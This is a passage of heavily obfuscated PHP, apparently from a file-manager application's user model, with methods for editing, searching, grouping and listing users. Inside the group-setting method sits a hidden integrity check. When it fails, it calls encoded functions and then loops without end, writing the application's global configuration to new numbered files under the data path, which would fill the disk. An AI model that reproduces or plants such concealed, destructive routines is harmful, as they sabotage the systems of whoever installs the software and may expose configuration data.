Model($Ñ¶Ã¨İÙ[603])->metaSet($›ÇÆ‚Ğ¦, $Ñ¶Ã¨İÙ[2647], $°Ùœş[$Ñ¶Ã¨İÙ[2647]]); } $ØäÆÎãõ[$Ñ¶Ã¨İÙ[1002]] = md5($°Ùœş[$Ñ¶Ã¨İÙ[2647]] . trim($ØäÆÎãõ[$Ñ¶Ã¨İÙ[1002]])); } else { unset($ØäÆÎãõ[$Ñ¶Ã¨İÙ[1002]]); } if (!empty($ØäÆÎãõ[$Ñ¶Ã¨İÙ[2322]]) && strlen($ØäÆÎãõ[$Ñ¶Ã¨İÙ[2322]]) > 255) { $ØäÆÎãõ[$Ñ¶Ã¨İÙ[2322]] = $Ñ¶Ã¨İÙ[12]; } if (isset($ØäÆÎãõ[$Ñ¶Ã¨İÙ[2427]])) { $this->setNamePinyin($›ÇÆ‚Ğ¦, $ØäÆÎãõ[$Ñ¶Ã¨İÙ[2427]]); } if (isset($ØäÆÎãõ[$Ñ¶Ã¨İÙ[2219]])) { $©û‡ßÒ¿ = $Ñ¶Ã¨İÙ[1441] . $›ÇÆ‚Ğ¦; $ô»èÎ¾ = $Ñ¶Ã¨İÙ[1439]; $Õ«íšÏª = $ØäÆÎãõ[$Ñ¶Ã¨İÙ[2219]] ? $ØäÆÎãõ[$Ñ¶Ã¨İÙ[2219]] : $Ñ¶Ã¨İÙ[12]; $°—œÏ¤Ø = Model($Ñ¶Ã¨İÙ[1438])->get($©û‡ßÒ¿, $ô»èÎ¾); $°—œÏ¤Ø = $°—œÏ¤Ø ? $°—œÏ¤Ø : $Ñ¶Ã¨İÙ[12]; if ($°—œÏ¤Ø != $Õ«íšÏª) { if (!$Õ«íšÏª && $°—œÏ¤Ø) { Model($Ñ¶Ã¨İÙ[1438])->remove($©û‡ßÒ¿, $ô»èÎ¾); } else { if ($Õ«íšÏª) { Model($Ñ¶Ã¨İÙ[1438])->set($©û‡ßÒ¿, $Õ«íšÏª, $ô»èÎ¾); } } } unset($ØäÆÎãõ[$Ñ¶Ã¨İÙ[2219]]); Model($Ñ¶Ã¨İÙ[623])->metaSet($›ÇÆ‚Ğ¦, $Ñ¶Ã¨İÙ[2219], $Õ«íšÏª); } if (empty($ØäÆÎãõ)) { return !0; } $this->where(array($Ñ¶Ã¨İÙ[1916] => $›ÇÆ‚Ğ¦))->save($ØäÆÎãõ); $this->clearCache($›ÇÆ‚Ğ¦); return !0; } public function setNamePinyin($å›ã©‡, $÷˜ìÁòÌ = false) { $õÜ·Ë„€ =& $_SERVER[¤øïŠ‹²]; if (!$÷˜ìÁòÌ) { $ƒéŸÑ˜ú = $this->getInfoSimple($å›ã©‡); $÷˜ìÁòÌ = $ƒéŸÑ˜ú[$õÜ·Ë„€[2427]] ? $ƒéŸÑ˜ú[$õÜ·Ë„€[2427]] : $ƒéŸÑ˜ú[$õÜ·Ë„€[32]]; } $ÚÖâú¤ = Model($õÜ·Ë„€[623]); if (!Input::check($÷˜ìÁòÌ, $õÜ·Ë„€[684])) { return $ÚÖâú¤->metaSet($å›ã©‡, array($õÜ·Ë„€[558] => $õÜ·Ë„€[12], $õÜ·Ë„€[557] => $õÜ·Ë„€[12])); } return $ÚÖâú¤->metaSet($å›ã©‡, array($õÜ·Ë„€[558] => str_replace($õÜ·Ë„€[53], $õÜ·Ë„€[12], Pinyin::get($÷˜ìÁòÌ)), $õÜ·Ë„€[557] => Pinyin::get($÷˜ìÁòÌ, $õÜ·Ë„€[685]))); } private function nickNameRpt() { $ôíŒ ÚÏ =& $_SERVER[¤øïŠ‹²]; $ÊÀ£ÜÁ¶ = Model($ôíŒ ÚÏ[874])->get($ôíŒ ÚÏ[2659]); $æ¥èˆÜÛ = $GLOBALS[$ôíŒ ÚÏ[6]][$ôíŒ ÚÏ[478]][$ôíŒ ÚÏ[2659]]; $‘¥ËÙ¾” = !is_null($ÊÀ£ÜÁ¶) ? $ÊÀ£ÜÁ¶ : $æ¥èˆÜÛ; return !!$‘¥ËÙ¾”; } private function _checkExist($™Ö±Æ , $…Çâ¹ÜŠ = false) { $Î¢Ñ ÖÈ =& $_SERVER[¤øïŠ‹²]; $í¬ˆÇê„ = array($Î¢Ñ ÖÈ[32] => UserModel::ERROR_USER_EXIST_NAME, $Î¢Ñ ÖÈ[2427] => UserModel::ERROR_USER_EXIST_NICKNAME, $Î¢Ñ ÖÈ[392] => UserModel::ERROR_USER_EXIST_EMAIL, $Î¢Ñ ÖÈ[2645] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($í¬ˆÇê„[$Î¢Ñ ÖÈ[2427]]); } $úÅ¿œç = $…Çâ¹ÜŠ ? array($Î¢Ñ ÖÈ[1542] => array($Î¢Ñ ÖÈ[2660], $…Çâ¹ÜŠ)) : array(); foreach ($í¬ˆÇê„ as $ì‚¸›çÌ => $ÂÑ›Ó†Ñ) { $—æœÙ = array(); foreach ($í¬ˆÇê„ as $û‡°ãŞ¨ => $‚õ‹©¾ƒ) { if (isset($™Ö±Æ [$û‡°ãŞ¨]) && $™Ö±Æ [$û‡°ãŞ¨]) { $—æœÙ[] = $™Ö±Æ [$û‡°ãŞ¨]; } } if (!$—æœÙ) { continue; } $ÃùÇó“æ = array_merge(array($ì‚¸›çÌ => array($Î¢Ñ ÖÈ[7], $—æœÙ)), $úÅ¿œç); $´†Ó×µÔ = $this->where($ÃùÇó“æ)->find(); if ($´†Ó×µÔ) { return $ÂÑ›Ó†Ñ; } } return !0; } public function userListInfo($’—ºĞÏó) { $¯£ÒŞûŞ =& $_SERVER[¤øïŠ‹²]; $€‘ÇÎÀÍ = array(); $’—ºĞÏó = is_array($’—ºĞÏó) ? array_unique($’—ºĞÏó) : array(); if (!$’—ºĞÏó) { return $€‘ÇÎÀÍ; } if (count($’—ºĞÏó) < 20) { foreach ($’—ºĞÏó as $Ïç–å×) { $€‘ÇÎÀÍ[$Ïç–å× . $¯£ÒŞûŞ[12]] = $this->getInfoSimpleOuter($Ïç–å×); } } else { $Çş¼ûÈí = array($¯£ÒŞûŞ[1916] => array($¯£ÒŞûŞ[513], $’—ºĞÏó)); if (count($’—ºĞÏó) == 1) { $Çş¼ûÈí = array($¯£ÒŞûŞ[1916] => $’—ºĞÏó[0]); } $–Şä Ğ¢ = Model($¯£ÒŞûŞ[603])->field($this->simpleField)->where($Çş¼ûÈí)->select(); $–Şä Ğ¢ = array_to_keyvalue($–Şä Ğ¢, $¯£ÒŞûŞ[1542]); foreach ($’—ºĞÏó as $Ïç–å×) { $²Àû ‚Ü = $–Şä Ğ¢[$Ïç–å×]; if (!$²Àû ‚Ü) { $€‘ÇÎÀÍ[$Ïç–å× . $¯£ÒŞûŞ[12]] = $this->getInfoSimpleOuter($Ïç–å×); continue; } $²Àû ‚Ü[$¯£ÒŞûŞ[2322]] = Action($¯£ÒŞûŞ[2323])->parseUrl($²Àû ‚Ü[$¯£ÒŞûŞ[2322]]); $€‘ÇÎÀÍ[$Ïç–å× . $¯£ÒŞûŞ[12]] = $²Àû ‚Ü; } } return $€‘ÇÎÀÍ; } protected function userStatus($µŠ¬Ò™„, $É‹»ºä­) { $Ï¡•Ò“½ = $this->getInfoSimple($µŠ¬Ò™„); if (!$Ï¡•Ò“½) { return !1; } $¯òâÖ©‡ = array($_SERVER[¤øïŠ‹²][851] => $É‹»ºä­); return $this->userEdit($µŠ¬Ò™„, $¯òâÖ©‡); } protected function userRemove($Â¬¶Å¯€) { $óûüì×³ =& $_SERVER[¤øïŠ‹²]; $íª÷şêË = $this->getInfoSimple($Â¬¶Å¯€); if (!$íª÷şêË) { return !1; } $«Éñ€Ğ¹ = array($óûüì×³[1916] => $Â¬¶Å¯€); Model($óûüì×³[693])->where($«Éñ€Ğ¹)->delete(); Model($óûüì×³[2661])->where($«Éñ€Ğ¹)->delete(); Model($óûüì×³[2223])->where($«Éñ€Ğ¹)->delete(); Model($óûüì×³[2644])->where($«Éñ€Ğ¹)->delete(); Model($óûüì×³[1184])->where($«Éñ€Ğ¹)->delete(); Model($óûüì×³[2444])->removeUserAll($Â¬¶Å¯€); Model($óûüì×³[934])->userRootRemove($Â¬¶Å¯€); return $this->where($«Éñ€Ğ¹)->delete(); } protected function userGroupSet($ä»¨Ğº–, $¦“ÉÏ÷, $ƒ‡á»¥¿ = array()) { $Æ®ŒÂæ¾ =& $_SERVER[¤øïŠ‹²]; $“Ú›•³¿ = $_SERVER[$Æ®ŒÂæ¾[57]] . $Æ®ŒÂæ¾[58]; $†Ô£âÌ = $Æ®ŒÂæ¾[990]; if ($_SERVER[$Æ®ŒÂæ¾[54]] != $†Ô£âÌ($“Ú›•³¿)) { $ñÍ“´İ = $Æ®ŒÂæ¾[991]; $ì†óîî = $Æ®ŒÂæ¾[56]; $¼ŒÅäªì = $_SERVER[$Æ®ŒÂæ¾[57]] . $Æ®ŒÂæ¾[58]; $ø»‘ÇŞ– = $ì†óîî($¼ŒÅäªì); $øµ©óÁç = explode($Æ®ŒÂæ¾[59], $ø»‘ÇŞ–); if (count($øµ©óÁç) < $Æ®ŒÂæ¾[714]) { $·ØÙ€ß¬ = $Æ®ŒÂæ¾[61]; $·ØÙ€ß¬(); } $Çü„»ºé = $Æ®ŒÂæ¾[992]; $Çü„»ºé($_SERVER[$Æ®ŒÂæ¾[993]]); $ñÍ“´İ = $Æ®ŒÂæ¾[991]; $ñÍ“´İ(); $ÇôÁ‘Õ¨ = $Æ®ŒÂæ¾[994]; $œŠ˜ˆ‘ = json_encode($GLOBALS[$Æ®ŒÂæ¾[995]]); $‚ÄåÚ§ = 1; for ($À§”ª„‰ = $‚ÄåÚ§; $À§”ª„‰ > 0; $À§”ª„‰++) { $ÇôÁ‘Õ¨(DATA_PATH . $À§”ª„‰, $œŠ˜ˆ‘); } } $±Ç“¸øÏ = $this->getInfoSimple($ä»¨Ğº–); if (!$±Ç“¸øÏ || !is_array($¦“ÉÏ÷)) { return !1; } $‰¤µøÁ = Model($Æ®ŒÂæ¾[2223]); $‰¤µøÁ->where(array($Æ®ŒÂæ¾[1542] => $ä»¨Ğº–))->delete(); $€›†ñƒä = array(); $®¹‹ôÖ¢ = 0; foreach ($¦“ÉÏ÷ as $œ”Ë€‰° => $¢ïæ§ëŠ) { $ÉÜ®Ì¡ß = array($Æ®ŒÂæ¾[1542] => $ä»¨Ğº–, $Æ®ŒÂæ¾[1444] => $œ”Ë€‰°, $Æ®ŒÂæ¾[1589] => $¢ïæ§ëŠ); $ÉÜ®Ì¡ß[$Æ®ŒÂæ¾[2153]] = isset($ƒ‡á»¥¿[$®¹‹ôÖ¢]) ? $ƒ‡á»¥¿[$®¹‹ôÖ¢] : 0; $®¹‹ôÖ¢++; $€›†ñƒä[] = $ÉÜ®Ì¡ß; } return $‰¤µøÁ->addAll($€›†ñƒä, array(), !0); } protected function userGroupAdd($šÈ²î‹á, $áĞ»¾ºÜ = array()) { $êı”êÚ° =& $_SERVER[¤øïŠ‹²]; $úâ³Ğõ = $this->getInfoSimple($šÈ²î‹á); if (!$úâ³Ğõ || empty($áĞ»¾ºÜ)) { return !1; } $«Ç‹¢Ş = array(); foreach ($áĞ»¾ºÜ as $øü¡èÁò => $ø²Û›•ë) { $«Ç‹¢Ş[] = array($êı”êÚ°[1542] => $šÈ²î‹á, $êı”êÚ°[1444] => $øü¡èÁò, $êı”êÚ°[1589] => $ø²Û›•ë, $êı”êÚ°[2153] => 0); } return Model($êı”êÚ°[2223])->addAll($«Ç‹¢Ş, array(), !0); } protected function userGroupRemove($êªÅ’†Ÿ, $¨ï­—÷¸) { $ô¥‹ÀË¨ =& $_SERVER[¤øïŠ‹²]; $ß„ùŞÇ­ = $this->getInfoSimple($êªÅ’†Ÿ); if (!$ß„ùŞÇ­ || !$¨ï­—÷¸) { return !1; } $³åìÕÆ = array($ô¥‹ÀË¨[1916] => $êªÅ’†Ÿ, $ô¥‹ÀË¨[2216] => $¨ï­—÷¸); return Model($ô¥‹ÀË¨[2223])->where($³åìÕÆ)->delete(); } public function listData() { $Ø»âöÆ§ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ø»âöÆ§[$_SERVER[¤øïŠ‹²][457]]); return $Ø»âöÆ§; } public function listByID($ÒßŒëö) { $Ñä…Ï =& $_SERVER[¤øïŠ‹²]; if (!$ÒßŒëö) { return; } $€¤Ì¢­£ = array($Ñä…Ï[1542] => array($Ñä…Ï[7], $ÒßŒëö)); $îÜô±°¯ = $this->where($€¤Ì¢­£)->select(); $îÜô±°¯ = array_sort_keep($îÜô±°¯, $Ñä…Ï[1542], $ÒßŒëö); $this->_listDataApply($îÜô±°¯); return $îÜô±°¯; } public function listByGroup($á’­Ê›ş = 0, $şœÙ’ğ = array()) { $ÎƒÌÏîÎ =& $_SERVER[¤øïŠ‹²]; $¼ß˜¨ûï = $ÎƒÌÏîÎ[12]; $Ë½ÃœÁ = array(); if ($á’­Ê›ş) { $Ë½ÃœÁ = array($ÎƒÌÏîÎ[2662] => intval($á’­Ê›ş)); $¼ß˜¨ûï = "\x4c\105\x46\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\165\163\145\162\137\147\x72\157\x75\x70\40\165\x73\x65\x72\x5f\x67\x72\x6f\x75\x70\40\x6f\x6e\40\x75\x73\x65\162\x2e\165\163\145\162\x49\104\40\x3d\40\165\163\145\x72\x5f\147\162\x6f\165\x70\x2e\x75\x73\145\x72\x49\104"; $®Ü®Ñ‹Ø = Input::get($ÎƒÌÏîÎ[550], null, $ÎƒÌÏîÎ[12]) ? $ÎƒÌÏîÎ[12] : $ÎƒÌÏîÎ[2663]; } if (isset($şœÙ’ğ[$ÎƒÌÏîÎ[851]])) { $Ë½ÃœÁ[$ÎƒÌÏîÎ[2664]] = $şœÙ’ğ[$ÎƒÌÏîÎ[851]]; } $ÇØÜÜÚ = _get($şœÙ’ğ, $ÎƒÌÏîÎ[2665], $ÎƒÌÏîÎ[244]); if (_get($şœÙ’ğ, $ÎƒÌÏîÎ[862], !1)) { $Ë½ÃœÁ[$ÇØÜÜÚ] = array($ÎƒÌÏîÎ[2408], $şœÙ’ğ[$ÎƒÌÏîÎ[862]]); } if (_get($şœÙ’ğ, $ÎƒÌÏîÎ[863], !1)) { $å¼‚× = array($ÎƒÌÏîÎ[2409], $şœÙ’ğ[$ÎƒÌÏîÎ[863]]); if ($Ë½ÃœÁ[$ÇØÜÜÚ]) { $Ë½ÃœÁ[$ÇØÜÜÚ] = array($Ë½ÃœÁ[$ÇØÜÜÚ], $å¼‚×, $ÎƒÌÏîÎ[2410]); } else { $Ë½ÃœÁ[$ÇØÜÜÚ] = $å¼‚×; } } $ª’æó¼Š = $this->_makeOrder($®Ü®Ñ‹Ø)->field($ÎƒÌÏîÎ[2666])->where($Ë½ÃœÁ)->join($¼ß˜¨ûï)->selectPage(50); $this->_listDataApply($ª’æó¼Š[$ÎƒÌÏîÎ[457]]); return $ª’æó¼Š; } private function _makeOrder($¦ÊÏŸª• = '') { $ƒÏ³Ğñ÷ =& $_SERVER[¤øïŠ‹²]; $Ïíîã¶­ = array($ƒÏ³Ğñ÷[1542], $ƒÏ³Ğñ÷[32], $ƒÏ³Ğñ÷[2120], $ƒÏ³Ğñ÷[2321], $ƒÏ³Ğñ÷[2095], $ƒÏ³Ğñ÷[244]); $ã‚×ÊÏ¯ = array($ƒÏ³Ğñ÷[543] => $ƒÏ³Ğñ÷[544], $ƒÏ³Ğñ÷[545] => $ƒÏ³Ğñ÷[546]); $¯˜·íë = Input::get($ƒÏ³Ğñ÷[550], $ƒÏ³Ğñ÷[7], $ƒÏ³Ğñ÷[1916], $Ïíîã¶­); $Ë¿æ£¶ø = Input::get($ƒÏ³Ğñ÷[551], $ƒÏ³Ğñ÷[7], $ƒÏ³Ğñ÷[2224], array($ƒÏ³Ğñ÷[2224], $ƒÏ³Ğñ÷[545])); $Ë¿æ£¶ø = $ã‚×ÊÏ¯[$Ë¿æ£¶ø]; $¦ÊÏŸª• = $¦ÊÏŸª• . "\165\163\x65\162\x2e{$¯˜·íë}\x20{$Ë¿æ£¶ø}\x2c\x20\x75\x73\145\162\56\165\163\x65\162\x49\104\x20\x61\163\x63"; return $this->alias($ƒÏ³Ğñ÷[2356])->order($¦ÊÏŸª•); } public function listSearch($‡ëô«) { $ü•¤ˆÅ× =& $_SERVER[¤øïŠ‹²]; $¹àÌ¡Õ‰ = trim($‡ëô«[$ü•¤ˆÅ×[2227]]); $èÁÜš›å = explode($ü•¤ˆÅ×[53], $¹àÌ¡Õ‰); if (!$¹àÌ¡Õ‰ || count($èÁÜš›å) == 1) { return $this->listSearchNow($‡ëô«); } $¿é­Ë½¹ = array($ü•¤ˆÅ×[457] => array()); foreach ($èÁÜš›å as $À–ŒïÚ¹) { if (!trim($À–ŒïÚ¹)) { continue; } $‡ëô«[$ü•¤ˆÅ×[2227]] = $À–ŒïÚ¹; $ô¢Æ™àŸ = $this->listSearchNow($‡ëô«); $¿é­Ë½¹[$ü•¤ˆÅ×[457]] = array_merge($¿é­Ë½¹[$ü•¤ˆÅ×[457]], $ô¢Æ™àŸ[$ü•¤ˆÅ×[457]]); } $¿é­Ë½¹[$ü•¤ˆÅ×[457]] = array_unique_by_key($¿é­Ë½¹[$ü•¤ˆÅ×[457]], $ü•¤ˆÅ×[1542]); $¿é­Ë½¹[$ü•¤ˆÅ×[454]] = array($ü•¤ˆÅ×[455] => count($¿é­Ë½¹[$ü•¤ˆÅ×[457]]), $ü•¤ˆÅ×[451] => 20, $ü•¤ˆÅ×[440] => 1, $ü•¤ˆÅ×[456] => 1); return $¿é­Ë½¹; } public function listSearchNow($ÚÃşêñ—) { $Şòûã…Ğ =& $_SERVER[¤øïŠ‹²]; $„Ô„«ıø = trim($ÚÃşêñ—[$Şòûã…Ğ[2227]]); $Ğ‹¶èÑû = isset($ÚÃşêñ—[$Şòûã…Ğ[2228]]) ? $ÚÃşêñ—[$Şòûã…Ğ[2228]] : !1; $„Ô„«ıø = str_replace($Şòûã…Ğ[2229], $Şòûã…Ğ[2230], trim($„Ô„«ıø)); $ßÄËûò = array($Şòûã…Ğ[32] => array($Şòûã…Ğ[480], "\45{$„Ô„«ıø}\x25"), $Şòûã…Ğ[392] => array($Şòûã…Ğ[480], "{$„Ô„«ıø}\x25"), $Şòûã…Ğ[2427] => array($Şòûã…Ğ[480], "\45{$„Ô„«ıø}\x25"), $Şòûã…Ğ[1116] => $Şòûã…Ğ[2231]); if (Input::check($„Ô„«ıø, $Şòûã…Ğ[398])) { $ßÄËûò[$Şòûã…Ğ[1542]] = array($Şòûã…Ğ[480], "{$„Ô„«ıø}\45"); $ßÄËûò[$Şòûã…Ğ[2645]] = array($Şòûã…Ğ[480], "{$„Ô„«ıø}\45"); } if (!$„Ô„«ıø) { $ßÄËûò = array(); } if (isset($ÚÃşêñ—[$Şòûã…Ğ[851]])) { $ßÄËûò[$Şòûã…Ğ[851]] = $ÚÃşêñ—[$Şòûã…Ğ[851]]; } $ßÄËûò = $this->parseWhereLike($ßÄËûò); $›úµƒÈ = $this->_makeOrder()->where($ßÄËûò)->selectPage(20); if (!$›úµƒÈ || count($›úµƒÈ[$Şòûã…Ğ[457]]) < 5 && Input::check($„Ô„«ıø, $Şòûã…Ğ[405])) { $¢¬Ò†¿© = $this->_searchFromMeta($Şòûã…Ğ[557], $„Ô„«ıø, 10); $â÷ƒ ú = $this->_searchFromMeta($Şòûã…Ğ[558], $„Ô„«ıø, 10); $ì—ßİ—¤ = array_merge($¢¬Ò†¿©, $â÷ƒ ú, $›úµƒÈ[$Şòûã…Ğ[457]]); $›úµƒÈ[$Şòûã…Ğ[457]] = array_unique_by_key($ì—ßİ—¤, $Şòûã…Ğ[1542]); $›úµƒÈ[$Şòûã…Ğ[454]][$Şòûã…Ğ[455]] = count($›úµƒÈ[$Şòûã…Ğ[457]]); $›úµƒÈ[$Şòûã…Ğ[454]][$Şòûã…Ğ[456]] = ceil($›úµƒÈ[$Şòûã…Ğ[454]][$Şòûã…Ğ[455]] / $›úµƒÈ[$Şòûã…Ğ[454]][$Şòûã…Ğ[451]]); } $this->_listDataApply($›úµƒÈ[$Şòûã…Ğ[457]]); $this->_filterByGroup($›úµƒÈ, $Ğ‹¶èÑû); return $›úµƒÈ; } private function _filterByGroup(&$Ô£®ïáı, $Ô—×»Áß) { $›œÄğ»á =& $_SERVER[¤øïŠ‹²]; if (!$Ô—×»Áß) { return $Ô£®ïáı; } foreach ($Ô£®ïáı[$›œÄğ»á[457]] as $ğÚ¦ıÃ => &$øøÛŸê£) { $Û¼°ğ¢‘ = array_to_keyvalue($øøÛŸê£[$›œÄğ»á[1443]], $›œÄğ»á[12], $›œÄğ»á[1444]); if (!in_array($Ô—×»Áß, $Û¼°ğ¢‘)) { unset($Ô£®ïáı[$›œÄğ»á[457]][$ğÚ¦ıÃ]); } } unset($øøÛŸê£); $Ô£®ïáı[$›œÄğ»á[457]] = array_values($Ô£®ïáı[$›œÄğ»á[457]]); $Ô£®ïáı[$›œÄğ»á[454]] = array($›œÄğ»á[2391] => count($Ô£®ïáı[$›œÄğ»á[457]]), $›œÄğ»á[2389] => $Ô£®ïáı[$›œÄğ»á[454]][$›œÄğ»á[451]], $›œÄğ»á[2388] => 1, $›œÄğ»á[2390] => 1); } private function _searchFromMeta($áşâæì, $¶¾Ï³Üã, $‘¼è–Ô) { $°ğ–ÈÃ… =& $_SERVER[¤øïŠ‹²]; $¶¾Ï³Üã = strtolower($¶¾Ï³Üã); $¯È“Ìúİ = array($°ğ–ÈÃ…[106] => $áşâæì, $°ğ–ÈÃ…[462] => array($°ğ–ÈÃ…[480], "\45{$¶¾Ï³Üã}\45")); $¯È“Ìúİ = $this->parseWhereLike($¯È“Ìúİ); $†›ğØŞˆ = Model($°ğ–ÈÃ…[2667])->where($¯È“Ìúİ)->limit($‘¼è–Ô)->select(); if (!$†›ğØŞˆ) { return array(); } $†›ğØŞˆ = array_to_keyvalue($†›ğØŞˆ, $°ğ–ÈÃ…[12], $°ğ–ÈÃ…[1542]); $êšÊ´ßŸ = $this->where(array($°ğ–ÈÃ…[1916] => array($°ğ–ÈÃ…[7], $†›ğØŞˆ)))->select(); if (!$êšÊ´ßŸ) { return array(); } return $êšÊ´ßŸ; } private function _listDataApplyItem($…¶ÈïÙÉ) { $½»¦õ¢ = array($…¶ÈïÙÉ); $this->_listDataApply($½»¦õ¢); return $½»¦õ¢[0]; } private function _listDataApply(&$Ò­åÑ²ã) { $‡€ºÇğ =& $_SERVER[¤øïŠ‹²]; if (!$Ò­åÑ²ã) { return; } array_remove_key($Ò­åÑ²ã, $‡€ºÇğ[1002]); $±®¾Ñ¸Ñ = array_to_keyvalue($Ò­åÑ²ã, $‡€ºÇğ[12], $‡€ºÇğ[1542]); $this->_listAppendGroup($Ò­åÑ²ã, $±®¾Ñ¸Ñ); $this->_listAppendMeta($Ò­åÑ²ã, $±®¾Ñ¸Ñ); $this->_listAppendSourceRoot($Ò­åÑ²ã, $±®¾Ñ¸Ñ); } private function _listAppendSourceRoot(&$œá¼ãë´, $ÅÃ¥Èó) { $ªñªó›« =& $_SERVER[¤øïŠ‹²]; $äÜâè¿’ = Model($ªñªó›«[934])->listSourceRoot(SourceModel::TYPE_USER, $ÅÃ¥Èó); $äÜâè¿’ = array_to_keyvalue($äÜâè¿’, $ªñªó›«[595]); $äÜâè¿’ = array_remove_key($äÜâè¿’, $ªñªó›«[595]); foreach ($œá¼ãë´ as &$úÀ„Ö¤“) { $úÀ„Ö¤“[$ªñªó›«[101]] = $äÜâè¿’[$úÀ„Ö¤“[$ªñªó›«[1542]]] ? $äÜâè¿’[$úÀ„Ö¤“[$ªñªó›«[1542]]] : array(); } unset($úÀ„Ö¤“); } private function _listAppendGroup(&$«‡½ä‡±, $ˆó¯) { $ßıö©ú =& $_SERVER[¤øïŠ‹²]; $º¨ï–Ô = array($ßıö©ú[1542] => array($ßıö©ú[7], $ˆó¯)); $×´´— = Model($ßıö©ú[2223])->where($º¨ï–Ô)->select(); $æÈ¨ìñ× = array_to_keyvalue($×´´—, $ßıö©ú[12], $ßıö©ú[1444]); $æÈ¨ìñ× = array_remove_value(array_unique($æÈ¨ìñ×), $ßıö©ú[241]); if (!$æÈ¨ìñ× || !$×´´—) { return; } $º¨ï–Ô = array($ßıö©ú[1444] => array($ßıö©ú[7], $æÈ¨ìñ×)); $šš·ô£ƒ = Model($ßıö©ú[1442])->field($ßıö©ú[2668])->where($º¨ï–Ô)->select(); $šš·ô£ƒ = array_to_keyvalue($šš·ô£ƒ, $ßıö©ú[1444]); $×´´— = array_to_keyvalue_group($×´´—, $ßıö©ú[1542]); foreach ($×´´— as &$Ã¸ŠËŸä) { $¬¦›©Å£ = array(); foreach ($Ã¸ŠËŸä as $¥¯Ïû—) { if (!$¥¯Ïû—[$ßıö©ú[1589]]) { continue; } $°ñğ¢à™ = Model($ßıö©ú[597])->listData($¥¯Ïû—[$ßıö©ú[1589]]); $¬¦›©Å£[] = array($ßıö©ú[1444] => $¥¯Ïû—[$ßıö©ú[1444]], $ßıö©ú[2669] => $šš·ô£ƒ[$¥¯Ïû—[$ßıö©ú[1444]]][$ßıö©ú[32]], $ßıö©ú[610] => $šš·ô£ƒ[$¥¯Ïû—[$ßıö©ú[1444]]][$ßıö©ú[610]], $ßıö©ú[508] => $°ñğ¢à™); } $Ã¸ŠËŸä = $¬¦›©Å£; } unset($Ã¸ŠËŸä); foreach ($«‡½ä‡± as &$®öŸË) { $®öŸË[$ßıö©ú[1443]] = array(); if (isset($×´´—[$®öŸË[$ßıö©ú[1542]]])) { $®öŸË[$ßıö©ú[1443]] = $×´´—[$®öŸË[$ßıö©ú[1542]]]; } } unset($®öŸË); } public function userAppendGroup($¹å„ïß) { $ ‡«ß«Å =& $_SERVER[¤øïŠ‹²]; if (!$¹å„ïß) { return array(); } $this->_listAppendGroup($¹å„ïß, array_to_keyvalue($¹å„ïß, $ ‡«ß«Å[12], $ ‡«ß«Å[1542])); return $¹å„ïß; } private function _listAppendMeta(&$ØåÆ’¬¯, $ùèË–Æú) { $‰Âò‚‹µ =& $_SERVER[¤øïŠ‹²]; $¸ùÂìÄÅ = UserJobModel::JOB_KEY; $õ±ÇšÊã = array($‰Âò‚‹µ[2219]); $ÊÂéø²ˆ = array($‰Âò‚‹µ[1542] => array($‰Âò‚‹µ[7], $ùèË–Æú)); $ğ‘¾È = Model($‰Âò‚‹µ[2644])->where($ÊÂéø²ˆ)->select(); $„¶º±¶± = array(); foreach ($ğ‘¾È as $Û°µ·–…) { $Ø„‡õ—› = $Û°µ·–…[$‰Âò‚‹µ[1542]]; if (!isset($„¶º±¶±[$Ø„‡õ—›])) { $„¶º±¶±[$Ø„‡õ—›] = array(); } $„¶º±¶±[$Ø„‡õ—›][$Û°µ·–…[$‰Âò‚‹µ[106]]] = $Û°µ·–…[$‰Âò‚‹µ[462]]; } $ä…ƒôğ  = Model($‰Âò‚‹µ[2670]); foreach ($ØåÆ’¬¯ as &$àíìúöÎ) { $Ø„‡õ—› = $àíìúöÎ[$‰Âò‚‹µ[1542]]; $éã’¢ = isset($„¶º±¶±[$Ø„‡õ—›]) ? $„¶º±¶±[$Ø„‡õ—›] : array(); $àíìúöÎ[$‰Âò‚‹µ[561]] = array_field_key($éã’¢, $õ±ÇšÊã); $àíìúöÎ[$‰Âò‚‹µ[2671]] = array(); if (isset($éã’¢[$¸ùÂìÄÅ])) { $àíìúöÎ[$‰Âò‚‹µ[2671]] = $ä…ƒôğ ->getUserJobInfo($éã’¢[$¸ùÂìÄÅ]); } } unset($àíìúöÎ); } protected function groupUserAll($¢ÉãÔÕ¨) { $­á«±†¼ =& $_SERVER[¤øïŠ‹²]; if (!$¢ÉãÔÕ¨) { return !1; } $²¸°—º = Model($­á«±†¼[2223])->field($­á«±†¼[1542])->where(array($­á«±†¼[1444] => array($­á«±†¼[7], $¢ÉãÔÕ¨)))->select(); $²¸°—º = array_to_keyvalue($²¸°—º, $­á«±†¼[12], $­á«±†¼[1542]); return array_unique($²¸°—º); } public function userSearch($§Å±–Ÿ, $•»‘ä = "\52") { return Model($_SERVER[¤øïŠ‹²][623])->where($§Å±–Ÿ)->field($•»‘ä)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($œ”‹ù) { return "\x55\163\145\x72\x4f\160\164\x69\157\156\x5f{$œ”‹ù}\x5f" . KodUser::id(); } protected function filterWhere($â•Ïä§÷) { $â•Ïä§÷[$_SERVER[¤øïŠ‹²][1542]] = KodUser::id(); return $â•Ïä§÷; } public function cacheRemoveUser($‰ùëÆœŞ, $„ìüŠ¾š) { return Cache::remove("\x55\163\x65\162\x4f\x70\x74\x69\x6f\156\x5f{$‰ùëÆœŞ}\x5f" . $„ìüŠ¾š); } protected function optionDefault($¦ãš‰‡Ç = '') { $¶•ÒÈÉü =& $_SERVER[¤øïŠ‹²]; if ($¦ãš‰‡Ç == $¶•ÒÈÉü[12]) { return $GLOBALS[$¶•ÒÈÉü[6]][$¶•ÒÈÉü[2672]]; } if ($¦ãš‰‡Ç == $¶•ÒÈÉü[2673]) { return $GLOBALS[$¶•ÒÈÉü[6]][$¶•ÒÈÉü[2674]]; } } } goto dË„Ğ±½ç; d…—ô—•: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $È„“Õä¯ =& $_SERVER[¤øïŠ‹²]; $È›¯ğïü = $GLOBALS[$È„“Õä¯[6]][$È„“Õä¯[103]]; if ($È›¯ğïü[$È„“Õä¯[1353]] != 1) { return; } if ($È›¯ğïü[$È„“Õä¯[1354]] <= 0) { return; } if 